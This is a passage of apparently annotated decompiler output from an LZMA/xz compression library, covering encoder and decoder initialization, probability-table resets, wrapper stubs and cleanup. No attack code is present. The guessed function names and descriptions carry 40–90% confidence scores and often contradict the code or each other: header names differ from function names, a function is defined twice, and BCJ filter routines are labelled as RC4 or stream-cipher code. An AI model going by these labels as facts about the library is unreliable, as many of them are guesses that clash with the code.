      uVar12 = uVar11 + 8;
      do {
        uVar7 = uVar12 >> 1;
        iVar10 = iVar10 + (uint)(byte)(&prob_price_table)
                                      [((uint)param_1[(ulong)uVar7 + param_2 * 8 + 2] ^
                                       -(uVar12 & 1) & 0x7ff) >> 4];
        uVar12 = uVar7;
      } while (uVar7 != 1);
      uVar11 = uVar11 + 1;
      *(uint *)puVar13 = iVar10 + (uint)bVar1;
      if (uVar6 <= uVar11) {
        return;
      }
      puVar13 = puVar13 + 2;
    } while (uVar11 < 8);
    if (uVar11 < uVar6) {
      puVar13 = puVar9 + (ulong)uVar11 * 2;
      do {
        uVar12 = uVar11;
        uVar8 = (ulong)uVar12;
        iVar10 = 0;
        do {
          uVar11 = (uint)uVar8;
          uVar7 = uVar11 >> 1;
          uVar8 = (ulong)uVar7;
          iVar10 = iVar10 + (uint)(byte)(&prob_price_table)
                                        [((uint)param_1[uVar8 + param_2 * 8 + 0x82] ^
                                         -(uVar11 & 1) & 0x7ff) >> 4];
        } while (uVar7 != 1);
        uVar11 = uVar12 + 1;
        *(uint *)puVar13 = iVar10 + (uint)bVar3 + (uint)bVar2;
        if (uVar6 <= uVar11) {
          return;
        }
        puVar13 = puVar13 + 2;
      } while (uVar11 < 0x10);
      if (uVar11 < uVar6) {
        uVar12 = uVar12 + 0xf1;
        puVar9 = puVar9 + (ulong)uVar11 * 2;
        do {
          uVar8 = (ulong)uVar12;
          iVar10 = 0;
          do {
            uVar11 = (uint)uVar8;
            uVar7 = uVar11 >> 1;
            uVar8 = (ulong)uVar7;
            iVar10 = iVar10 + (uint)(byte)(&prob_price_table)
                                          [((uint)param_1[uVar8 + 0x102] ^ -(uVar11 & 1) & 0x7ff) >>
                                           4];
          } while (uVar7 != 1);
          uVar12 = uVar12 + 1;
          *(uint *)puVar9 = iVar10 + (uint)bVar4 + (uint)bVar2;
          puVar9 = puVar9 + 2;
        } while (uVar6 + 0xf0 != uVar12);
      }
    }
  }
  return;
}



/**
 * @name  lzma_lzma_encoder_reset_prices
 * @brief Initializes LZMA encoder probability tables with 0x400 values across multiple offset ranges.
 * @confidence 70%
 * @classification init
 * @address 0x00118b20
 */

/* Initializes a memory block structure by setting initial value and writing 0x400 to multiple
   offsets, with optional element-wise initialization */

void initialize_memory_block_structure(undefined4 *param_1,uint param_2,char param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  uint uVar3;
  uint uVar4;
  
  *param_1 = 0x4000400;
  if ((ulong)param_2 != 0) {
    puVar1 = param_1;
    do {
      puVar2 = puVar1 + 4;
      *(undefined2 *)(puVar1 + 1) = 0x400;
      *(undefined2 *)((long)puVar1 + 6) = 0x400;
      *(undefined2 *)(puVar1 + 2) = 0x400;
      *(undefined2 *)((long)puVar1 + 10) = 0x400;
      *(undefined2 *)(puVar1 + 3) = 0x400;
      *(undefined2 *)((long)puVar1 + 0xe) = 0x400;
      *(undefined2 *)puVar2 = 0x400;
      *(undefined2 *)((long)puVar1 + 0x12) = 0x400;
      *(undefined2 *)(puVar1 + 0x41) = 0x400;
      *(undefined2 *)((long)puVar1 + 0x106) = 0x400;
      *(undefined2 *)(puVar1 + 0x42) = 0x400;
      *(undefined2 *)((long)puVar1 + 0x10a) = 0x400;
      *(undefined2 *)(puVar1 + 0x43) = 0x400;
      *(undefined2 *)((long)puVar1 + 0x10e) = 0x400;
      *(undefined2 *)(puVar1 + 0x44) = 0x400;
      *(undefined2 *)((long)puVar1 + 0x112) = 0x400;
      puVar1 = puVar2;
    } while (puVar2 != param_1 + (ulong)param_2 * 4);
  }
  puVar1 = param_1 + 0x81;
  do {
    puVar2 = (undefined4 *)((long)puVar1 + 2);
    *(undefined2 *)puVar1 = 0x400;
    puVar1 = puVar2;
  } while (param_1 + 0x101 != puVar2);
  if ((param_3 == '\0') && (param_2 != 0)) {
    uVar3 = 0;
    do {
      uVar4 = uVar3 + 1;
      lzma_literal_price_init(param_1,uVar3);
      uVar3 = uVar4;
    } while (param_2 != uVar4);
  }
  return;
}



/**
 * @name  lzma_lzma_encoder_reset
 * @brief Resets LZMA encoder internal state. Validates filter properties, initializes position state mask, literal context/position bits, all range encoder probability tables to 0x400, and length encoder tables.
 * @confidence 82%
 * @classification init
 * @address 0x0011a340
 */

/* Initializes an LZMA encoder's internal state. Validates the filter chain, then sets up position
   state mask, literal context/position bits, initializes all range encoder probability tables to
   0x400 (midpoint probability), and calls initialize_memory_block_structure for length encoder
   tables. */

undefined8 lzma_encoder_init(undefined8 *param_1,long param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  long lVar4;
  char cVar5;
  undefined8 uVar6;
  undefined8 *puVar7;
  long lVar8;
  undefined8 *puVar9;
  undefined2 *puVar10;
  byte bVar11;
  byte bVar12;
  undefined2 *puVar13;
  undefined2 *puVar14;
  uint uVar15;
  long lVar16;
  int iVar17;
  uint uVar18;
  
  lVar16 = param_2;
  cVar5 = lzma_lzma_lclppb_validate();
  uVar6 = 8;
  if (cVar5 != '\0') {
    uVar1 = *(undefined4 *)(param_2 + 0x1c);
    uVar2 = *(undefined4 *)(lVar16 + 0x18);
    uVar3 = *(undefined4 *)(lVar16 + 0x14);
    *(undefined1 *)((long)param_1 + 0x14) = 0;
    iVar17 = 1 << ((byte)uVar1 & 0x1f);
    *param_1 = 0;
    bVar11 = (byte)uVar2;
    uVar15 = iVar17 - 1;
    *(undefined4 *)((long)param_1 + 0xb7c) = uVar3;
    bVar12 = (byte)uVar3;
    *(uint *)(param_1 + 0x16f) = uVar15;
    param_1[1] = 1;
    uVar18 = 0x300 << (bVar12 + bVar11 & 0x1f);
    *(uint *)(param_1 + 0x170) = (0x100 << (bVar11 & 0x1f)) - (0x100U >> (bVar12 & 0x1f));
    *(undefined4 *)(param_1 + 2) = 0xffffffff;
    param_1[3] = 0;
    param_1[4] = 0;
    param_1[5] = 0;
    param_1[0x59] = 0;
    param_1[0x5a] = 0;
    *(undefined4 *)(param_1 + 0x5b) = 0;
    puVar9 = param_1;
    if (uVar18 != 0) {
      do {
        puVar7 = (undefined8 *)((long)puVar9 + 2);
        *(undefined2 *)((long)puVar9 + 0xb84) = 0x400;
        puVar9 = puVar7;
      } while (puVar7 != (undefined8 *)((long)param_1 + (ulong)uVar18 * 2));
    }
    lVar16 = (long)param_1 + (ulong)uVar15 * 2 + 2;
    puVar13 = (undefined2 *)((long)param_1 + 0x6d04);
    do {
      lVar4 = ~(ulong)uVar15 * 2 + lVar16;
      do {
        lVar8 = lVar4;
        *(undefined2 *)(lVar8 + 0x6b84) = 0x400;
        *(undefined2 *)(lVar8 + 0x6d64) = 0x400;
        lVar4 = lVar8 + 2;
      } while (lVar8 + 2 != lVar16);
      puVar13[0x18] = 0x400;
      puVar14 = puVar13 + 1;
      lVar16 = lVar8 + 0x22;
      *puVar13 = 0x400;
      puVar13[0xc] = 0x400;
      puVar13[0x24] = 0x400;
      puVar13 = puVar14;
    } while (puVar14 != (undefined2 *)((long)param_1 + 0x6d1c));
    puVar9 = (undefined8 *)((long)param_1 + 0x70e4);
    do {
      puVar7 = (undefined8 *)((long)puVar9 + 2);
      *(undefined2 *)puVar9 = 0x400;
      puVar9 = puVar7;
    } while (puVar7 != param_1 + 0xe39);
    puVar13 = (undefined2 *)((long)param_1 + 0x6f64);
    do {
      puVar14 = puVar13 - 0x40;
      do {
        puVar10 = puVar14;
        *puVar10 = 0x400;
        puVar14 = puVar10 + 1;
      } while (puVar10 + 1 != puVar13);
      puVar13 = puVar10 + 0x41;
    } while (puVar13 != (undefined2 *)((long)param_1 + 0x7164));
    puVar9 = param_1 + 0xe39;
    do {
      puVar7 = (undefined8 *)((long)puVar9 + 2);
      *(undefined2 *)puVar9 = 0x400;
      puVar9 = puVar7;
    } while (param_1 + 0xe3d != puVar7);
    initialize_memory_block_structure(param_1 + 0xe3d,iVar17,*(undefined1 *)((long)param_1 + 0xb74))
    ;
    initialize_memory_block_structure
              (param_1 + 0x1746,1 << ((byte)*(undefined4 *)(param_2 + 0x1c) & 0x1f),
               *(undefined1 *)((long)param_1 + 0xb74));
    uVar6 = 0;
    *(undefined4 *)((long)param_1 + 0x10e7c) = 0x7fffffff;
    param_1[0x21d8] = 0x7fffffff;
    *(undefined4 *)(param_1 + 0x21d9) = 0;
  }
  return uVar6;
}



/**
 * @name  lzma_lzma2_encoder_coder_init
 * @brief Sets LZMA2 encoder function pointers for encode and set_out_limit, initializes sub-encoder
 * @confidence 80%
 * @classification init
 * @address 0x0011a730
 */

/* Sets up LZMA2 encoder function pointers and initializes sub-encoder */

undefined8
lzma_lzma2_encoder_coder_init(long param_1,undefined8 param_2,undefined8 param_3,long param_4)

{
  undefined8 uVar1;
  
  if (param_4 != 0) {
    *(code **)(param_1 + 8) = lzma2_encoder_encode;
    *(code **)(param_1 + 0x20) = lzma_lzma2_encoder_set_out_limit;
    uVar1 = lzma_lzma2_encoder_init();
    return uVar1;
  }
  return 0xb;
}



/**
 * @name  lzma_lzma_decoder_reset
 * @brief Resets all LZMA range decoder probability tables to default mid-probability (0x400). Initializes literal coders, match/rep/len coders, position slot coders, alignment bits, and state variables based on lc/lp/pb properties.
 * @confidence 85%
 * @classification init
 * @address 0x0011ccd0
 */

/* Initializes all LZMA range decoder probability tables to the default mid-probability value (0x400
   = 1024 = kBitModelTotal/2). Initializes literal coders, match/rep/lencoders, position slot
   coders, alignment bits, and various state variables. The properties (lc, lp, pb) from lzma_props
   determine table sizes. */

void lzma_range_decoder_init(undefined2 *param_1,long param_2)

{
  uint uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  uint uVar5;
  undefined2 *puVar6;
  undefined2 *puVar7;
  undefined2 *puVar8;
  undefined2 *puVar9;
  int iVar10;
  ulong uVar11;
  
  uVar2 = *(undefined4 *)(param_2 + 0x14);
  iVar10 = 1 << ((byte)*(undefined4 *)(param_2 + 0x1c) & 0x1f);
  bVar3 = (byte)*(undefined4 *)(param_2 + 0x18);
  bVar4 = (byte)uVar2;
  uVar1 = iVar10 - 1;
  uVar5 = 0x300 << (bVar3 + bVar4 & 0x1f);
  if (uVar5 != 0) {
    puVar9 = param_1;
    do {
      puVar8 = puVar9 + 1;
      *puVar9 = 0x400;
      puVar9 = puVar8;
    } while (puVar8 != param_1 + uVar5);
  }
  *(uint *)(param_1 + 0x3746) = uVar1;
  uVar11 = (ulong)uVar1;
  *(undefined4 *)(param_1 + 0x3748) = uVar2;
  *(undefined8 *)(param_1 + 0x373a) = 5;
  *(undefined8 *)(param_1 + 0x373e) = 0;
  *(undefined8 *)(param_1 + 0x3742) = 0;
  *(undefined8 *)(param_1 + 0x3736) = 0xffffffff;
  *(uint *)(param_1 + 0x374a) = (0x100 << (bVar3 & 0x1f)) - (0x100U >> (bVar4 & 0x1f));
  puVar9 = param_1 + uVar11 + 1;
  puVar8 = param_1 + 0x30c0;
  do {
    puVar6 = puVar9 + ~uVar11;
    do {
      puVar7 = puVar6 + 1;
      puVar6[0x3000] = 0x400;
      puVar6[0x30f0] = 0x400;
      puVar6 = puVar7;
    } while (puVar9 != puVar7);
    puVar6 = puVar8 + 1;
    puVar9 = puVar9 + 0x10;
    puVar8[0xc] = 0x400;
    puVar8[0x18] = 0x400;
    *puVar8 = 0x400;
    puVar8[0x24] = 0x400;
    puVar8 = puVar6;
  } while (param_1 + 0x30cc != puVar6);
  puVar9 = param_1 + 0x31f0;
  do {
    puVar8 = puVar9 - 0x40;
    do {
      puVar6 = puVar8;
      *puVar6 = 0x400;
      puVar8 = puVar6 + 1;
    } while (puVar6 + 1 != puVar9);
    puVar9 = puVar6 + 0x41;
  } while (puVar9 != param_1 + 0x32f0);
  puVar9 = param_1 + 0x32b0;
  do {
    puVar8 = puVar9 + 1;
    *puVar9 = 0x400;
    puVar9 = puVar8;
  } while (puVar8 != param_1 + 0x3322);
  do {
    puVar9 = puVar8 + 1;
    *puVar8 = 0x400;
    puVar8 = puVar9;
  } while (param_1 + 0x3332 != puVar9);
  *(undefined4 *)(param_1 + 0x3332) = 0x4000400;
  *(undefined4 *)(param_1 + 0x3534) = 0x4000400;
  if (iVar10 != 0) {
    puVar9 = param_1 + 0x3334;
    do {
      *puVar9 = 0x400;
      puVar9[1] = 0x400;
      puVar8 = puVar9 + 8;
      puVar9[2] = 0x400;
      puVar9[3] = 0x400;
      puVar9[4] = 0x400;
      puVar9[5] = 0x400;
      puVar9[6] = 0x400;
      puVar9[7] = 0x400;
      puVar9[0x80] = 0x400;
      puVar9[0x81] = 0x400;
      puVar9[0x82] = 0x400;
      puVar9[0x83] = 0x400;
      puVar9[0x84] = 0x400;
      puVar9[0x85] = 0x400;
      puVar9[0x86] = 0x400;
      puVar9[0x87] = 0x400;
      puVar9[0x202] = 0x400;
      puVar9[0x203] = 0x400;
      puVar9[0x204] = 0x400;
      puVar9[0x205] = 0x400;
      puVar9[0x206] = 0x400;
      puVar9[0x207] = 0x400;
      puVar9[0x208] = 0x400;
      puVar9[0x209] = 0x400;
      puVar9[0x282] = 0x400;
      puVar9[0x283] = 0x400;
      puVar9[0x284] = 0x400;
      puVar9[0x285] = 0x400;
      puVar9[0x286] = 0x400;
      puVar9[0x287] = 0x400;
      puVar9[0x288] = 0x400;
      puVar9[0x289] = 0x400;
      puVar9 = puVar8;
    } while (puVar8 != param_1 + uVar11 * 8 + 0x333c);
  }
  puVar9 = param_1 + 0x3434;
  do {
    puVar8 = puVar9 + 1;
    *puVar9 = 0x400;
    puVar9 = puVar8;
  } while (puVar8 != param_1 + 0x3534);
  puVar9 = param_1 + 0x3636;
  do {
    puVar8 = puVar9 + 1;
    *puVar9 = 0x400;
    puVar9 = puVar8;
  } while (param_1 + 0x3736 != puVar8);
  *(undefined4 *)(param_1 + 0x3752) = 1;
  *(undefined8 *)(param_1 + 0x3754) = 0;
  *(undefined8 *)(param_1 + 0x3758) = 0;
  *(undefined8 *)(param_1 + 0x375c) = 0;
  return;
}



/**
 * @name  lzma_lzma_decoder_create
 * @brief Creates/initializes LZMA decoder state with lclppb validation, range decoder init, and uncompressed size configuration.
 * @confidence 68%
 * @classification init
 * @address 0x001203c0
 */

int FUN_001203c0(long *param_1,undefined8 param_2,long param_3,long param_4,undefined8 param_5)

{
  long lVar1;
  int iVar2;
  long lVar3;
  byte bVar4;
  
  iVar2 = 0xb;
  if ((((*(uint *)(param_4 + 0x14) < 5) && (*(uint *)(param_4 + 0x18) < 5)) &&
      (*(uint *)(param_4 + 0x14) + *(uint *)(param_4 + 0x18) < 5)) &&
     (*(uint *)(param_4 + 0x1c) < 5)) {
    if (param_3 == 0x4000000000000002) {
      if ((*(uint *)(param_4 + 0x30) & 0xfffffffe) != 0) {
        return 8;
      }
      lVar3 = *(long *)(param_4 + 0x34);
      bVar4 = lVar3 == -1 | (byte)*(uint *)(param_4 + 0x30) & 1;
    }
    else {
      bVar4 = 1;
      lVar3 = -1;
    }
    iVar2 = lzma_lzma_decoder_init_state(param_1,param_2,param_4,param_5);
    if (iVar2 == 0) {
      lzma_range_decoder_init(*param_1,param_4);
      lVar1 = *param_1;
      *(long *)(lVar1 + 0x6e98) = lVar3;
      *(byte *)(lVar1 + 0x6ea0) = bVar4;
    }
  }
  return iVar2;
}



/**
 * @name  lzma_lzma_encoder_init
 * @brief Initializes LZMA encoder: allocates 0x100a8-byte state, copies options, sets up callbacks, ensures min dict size 0x10000.
 * @confidence 78%
 * @classification init
 * @address 0x001206e0
 */

/* Initializes an LZMA encoder context. Allocates a large state structure (0x100a8 bytes), copies
   encoder options from param_4, sets up function pointers for encode/end/validate operations, then
   calls a sub-encoder init. Ensures minimum dictionary size of 0x10000. */

undefined8
lzma_encoder_init(undefined8 *param_1,undefined8 param_2,undefined8 param_3,undefined8 *param_4,
                 long *param_5)

{
  undefined8 uVar1;
  long uVar2;
  undefined4 *puVar3;
  bool bVar4;
  
  if (param_4 == (undefined8 *)0x0) {
    return 0xb;
  }
  puVar3 = (undefined4 *)*param_1;
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = (undefined4 *)lzma_alloc(0x100a8);
    if (puVar3 == (undefined4 *)0x0) {
      return 5;
    }
    *param_1 = puVar3;
    param_1[1] = lzma_block_buffer_encode_state_machine;
    param_1[2] = lzma_stream_decoder_end;
    param_1[3] = lzma_lzma_encoder_filter_update;
    *(undefined8 *)(puVar3 + 2) = 0;
  }
  uVar2 = param_4[1];
  bVar4 = true;
  *(undefined8 *)(puVar3 + 4) = *param_4;
  *(undefined8 *)(puVar3 + 6) = uVar2;
  uVar2 = param_4[3];
  *(undefined8 *)(puVar3 + 8) = param_4[2];
  *(undefined8 *)(puVar3 + 10) = uVar2;
  uVar2 = param_4[5];
  *(undefined8 *)(puVar3 + 0xc) = param_4[4];
  *(undefined8 *)(puVar3 + 0xe) = uVar2;
  uVar2 = param_4[7];
  *(undefined8 *)(puVar3 + 0x10) = param_4[6];
  *(undefined8 *)(puVar3 + 0x12) = uVar2;
  uVar2 = param_4[9];
  *(undefined8 *)(puVar3 + 0x14) = param_4[8];
  *(undefined8 *)(puVar3 + 0x16) = uVar2;
  uVar2 = param_4[0xb];
  *(undefined8 *)(puVar3 + 0x18) = param_4[10];
  *(undefined8 *)(puVar3 + 0x1a) = uVar2;
  uVar2 = param_4[0xc];
  uVar1 = param_4[0xd];
  *puVar3 = 0;
  *(undefined2 *)(puVar3 + 0x20) = 1;
  *(undefined8 *)(puVar3 + 0x1c) = uVar2;
  *(undefined8 *)(puVar3 + 0x1e) = uVar1;
  if (*(long *)(puVar3 + 6) != 0) {
    bVar4 = puVar3[8] == 0;
  }
  *(bool *)((long)puVar3 + 0x82) = bVar4;
  uVar2 = lzma_lzma2_encoder_init(puVar3 + 2,param_2,0x21,puVar3 + 4,param_5);
  if (((int)uVar2 == 0) && ((ulong)(*param_5 + param_5[1]) < 0x10000)) {
    *param_5 = 0x10000 - param_5[1];
  }
  return uVar2;
}



/**
 * @name  lzma_lzma_decoder_init
 * @brief Initializes LZMA1 decoder: allocates 0xb8-byte state, sets up decode/end callbacks, calls filter init.
 * @confidence 78%
 * @classification init
 * @address 0x00120e20
 */

/* Initializes LZMA alone decoder by allocating structure, setting up function pointers
   (lzma_block_decode, lzma_alone_decoder_end), and calling filter initialization */

undefined8
lzma_alone_decoder_init
          (undefined8 *param_1,undefined8 param_2,undefined8 param_3,long param_4,undefined8 param_5
          )

{
  long lVar1;
  undefined8 uVar2;
  undefined4 *puVar3;
  bool bVar4;
  
  puVar3 = (undefined4 *)*param_1;
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = (undefined4 *)lzma_alloc(0xb8,param_2,param_4,param_5);
    if (puVar3 == (undefined4 *)0x0) {
      return 5;
    }
    *param_1 = puVar3;
    param_1[1] = lzma_block_decode;
    param_1[4] = lzma_alone_decoder_end;
    *(undefined8 *)(puVar3 + 2) = 0;
    *(undefined8 *)(puVar3 + 4) = 0;
    *(undefined8 *)(puVar3 + 6) = 0;
    *(undefined8 *)(puVar3 + 8) = 0;
    *(undefined8 *)(puVar3 + 10) = 0;
  }
  lVar1 = *(long *)(param_4 + 8);
  *puVar3 = 0;
  bVar4 = true;
  *(undefined1 *)(puVar3 + 0x10) = 1;
  if (lVar1 != 0) {
    bVar4 = *(int *)(param_4 + 0x10) == 0;
  }
  *(bool *)((long)puVar3 + 0x41) = bVar4;
  uVar2 = lzma_lzma_decoder_init_state(puVar3 + 2,param_2,param_4,param_5);
  return uVar2;
}



/**
 * @name  lzma_delta_coder_init
 * @brief Creates and initializes a delta codec context (0x70 bytes) from a property byte encoding distance parameters.
 * @confidence 72%
 * @classification init
 * @address 0x00121280
 */

/* Creates and initializes an LZMA literal codec context. Validates literal codec spec byte,
   allocates 0x70-byte context, and initializes probability state based on codec type. */

undefined8 lzma_lc_create(undefined8 *param_1,undefined8 param_2,byte *param_3,long param_4)

{
  uint *puVar1;
  undefined8 uVar2;
  uint uVar3;
  
  if (param_4 != 1) {
    return 8;
  }
  if (((*param_3 & 0xc0) == 0) && (*param_3 < 0x29)) {
    puVar1 = (uint *)lzma_alloc(0x70);
    if (puVar1 != (uint *)0x0) {
      if (*param_3 == 0x28) {
        *puVar1 = 0xffffffff;
      }
      else {
        uVar3 = (uint)(*param_3 & 1 | 2);
        *puVar1 = uVar3;
        *puVar1 = uVar3 << ((*param_3 >> 1) + 0xb & 0x1f);
      }
      puVar1[2] = 0;
      puVar1[3] = 0;
      puVar1[4] = 0;
      *param_1 = puVar1;
      return 0;
    }
    uVar2 = 5;
  }
  else {
    uVar2 = 8;
  }
  return uVar2;
}



/**
 * @name  bcj_decoder_init
 * @brief Sets up BCJ decoder function pointers at coder+0x18 and coder+0x40, then calls branch_filter_init
 * @confidence 70%
 * @classification init
 * @address 0x00121600
 */

/* Sets up BCJ decoder function pointers and calls branch_filter_init */

void bcj_decoder_init(long param_1)

{
  *(code **)(param_1 + 0x18) = stream_cipher_decrypt;
  *(code **)(param_1 + 0x40) = FUN_001215f0;
  branch_filter_init();
  return;
}



/**
 * @name  bcj_encoder_init
 * @brief Sets encoder code function pointer and calls branch_filter_init for BCJ filter
 * @confidence 70%
 * @classification init
 * @address 0x001216f0
 */

/* Sets encoder function pointer and calls branch_filter_init */

void bcj_encoder_init(long param_1)

{
  *(code **)(param_1 + 0x18) = rc4_ksa_update;
  branch_filter_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init
 * @brief Initializes LZ encoder: allocates context with buffer, sets up encode/end callbacks, delegates to filter init.
 * @confidence 75%
 * @classification init
 * @address 0x00121b80
 */

/* Initializes LZ encoder state. Allocates encoder context structure, sets up read/finalize
   callbacks, configures match finder buffer, and delegates to set_filter_and_init for final setup.
    */

undefined8
lzma_lz_encoder_init
          (undefined8 *param_1,undefined8 param_2,long param_3,undefined8 param_4,long param_5,
          long param_6,int param_7,undefined1 param_8)

{
  uint uVar1;
  undefined8 uVar2;
  undefined1 (*pauVar3) [16];
  long lVar4;
  
  pauVar3 = (undefined1 (*) [16])*param_1;
  if (pauVar3 == (undefined1 (*) [16])0x0) {
    pauVar3 = (undefined1 (*) [16])lzma_alloc(param_6 * 2 + 0x90);
    if (pauVar3 == (undefined1 (*) [16])0x0) {
      return 5;
    }
    *param_1 = pauVar3;
    param_1[3] = stream_decode_with_buffering;
    param_1[4] = lzma_lz_encoder_end;
    param_1[8] = FUN_00121770;
    *pauVar3 = (undefined1  [16])0x0;
    *(undefined8 *)(pauVar3[5] + 8) = param_4;
    *(undefined8 *)(*pauVar3 + 8) = 0xffffffffffffffff;
    *(long *)pauVar3[7] = param_6 * 2;
    pauVar3[1] = (undefined1  [16])0x0;
    pauVar3[2] = (undefined1  [16])0x0;
    pauVar3[3] = (undefined1  [16])0x0;
    pauVar3[4] = (undefined1  [16])0x0;
    if (param_5 == 0) {
      *(undefined8 *)pauVar3[6] = 0;
    }
    else {
      lVar4 = lzma_alloc(param_5);
      *(long *)pauVar3[6] = lVar4;
      if (lVar4 == 0) {
        return 5;
      }
    }
  }
  if (*(uint **)(param_3 + 0x10) == (uint *)0x0) {
    *(undefined4 *)(pauVar3[6] + 8) = 0;
  }
  else {
    uVar1 = **(uint **)(param_3 + 0x10);
    *(uint *)(pauVar3[6] + 8) = uVar1;
    if ((param_7 - 1U & uVar1) != 0) {
      return 8;
    }
  }
  pauVar3[5][1] = param_8;
  pauVar3[5][0] = 0;
  *(undefined8 *)(pauVar3[7] + 8) = 0;
  *(undefined8 *)pauVar3[8] = 0;
  *(undefined8 *)(pauVar3[8] + 8) = 0;
  uVar2 = set_filter_and_init(pauVar3,param_2,param_3 + 0x18);
  return uVar2;
}



/**
 * @name  lzma_lzma_encoder_reset
 * @brief Calls lzma_lz_encoder_init and on success initializes encoder state
 * @confidence 70%
 * @classification init
 * @address 0x00121fb0
 */

/* Calls lzma_lz_encoder_init and sets error value on failure */

void lzma_lzma_encoder_reset(long *param_1)

{
  int iVar1;
  
  iVar1 = lzma_lz_encoder_init();
  if (iVar1 == 0) {
    **(undefined8 **)(*param_1 + 0x60) = 0xfffffffb00000000;
  }
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_0
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x001220e0
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_0(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_1
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122110
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_1(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_2
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122310
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_2(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_3
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122340
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_9(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_10
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122420
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_10(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_11
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122450
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_11(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_12
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x001225a0
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_12(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_13
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x001225d0
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_13(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_4
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122720
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_3(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_5
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122750
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_4(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_6
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122890
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_5(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_7
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x001228c0
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_6(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_8
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122cd0
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_7(void)

{
  lzma_lz_encoder_init();
  return;
}



/**
 * @name  lzma_lz_encoder_init_wrapper_9
 * @brief Tail-call wrapper for lzma_lz_encoder_init
 * @confidence 40%
 * @classification init
 * @address 0x00122d00
 */

/* Wrapper that calls lzma_lz_encoder_init() */

void lzma_lz_encoder_init_wrapper_8(void)

{
  lzma_lz_encoder_init();
  return;
}



/* ==================== Cleanup ==================== */

/**
 * @name  fini
 * @brief Standard CRT finalization: calls __cxa_finalize and cleanup functions
 * @confidence 90%
 * @classification cleanup
 * @address 0x00104fa0
 */

/* Program finalization with __cxa_finalize and cleanup */

void fini(void)

{
  if (DAT_00132380 == '\0') {
    if (PTR___cxa_finalize_00131fe0 != (undefined *)0x0) {
      __cxa_finalize(PTR_LOOP_00132358);
    }
    noop_stub();
    DAT_00132380 = 1;
    return;
  }
  return;
}



/**
 * @name  lzma_next_coder_cleanup
 * @brief Calls destructor or free, then zeros out 5 fields of next_coder structure
 * @confidence 85%
 * @classification cleanup
 * @address 0x001051a0
 */

/* Calls destructor if present, zeros out 5 fields of next_coder struct */

void lzma_next_coder_cleanup(undefined1 (*param_1) [16])

{
  if (*(code **)param_1[2] == (code *)0x0) {
    lzma_free(*(undefined8 *)*param_1);
  }
  else {
    (**(code **)param_1[2])();
  }
  *param_1 = (undefined1  [16])0x0;
  param_1[1] = (undefined1  [16])0x0;
  *(undefined8 *)(*param_1 + 8) = 0xffffffffffffffff;
  param_1[2] = (undefined1  [16])0x0;
  param_1[3] = (undefined1  [16])0x0;
  param_1[4] = (undefined1  [16])0x0;
  return;
}



/**
